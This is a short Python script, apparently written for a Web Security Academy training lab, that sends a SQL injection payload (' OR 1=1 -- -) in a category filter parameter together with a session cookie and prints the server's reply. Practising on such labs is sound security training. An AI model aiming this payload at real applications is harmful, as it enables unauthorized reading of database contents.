import requests
import json
url = "https://0a11002b04809cf6c0923b19009e001d.web-security-academy.net/"
cookies = {
	"session": "SNGcHflmqWYkHXdKk3AqH9S6gedA1vnt"
}

params = {
	"category": "' OR 1=1 -- -"
}

r = requests.get(url + "filter", params=params, cookies=cookies)
print(r.status_code)
print(r.text)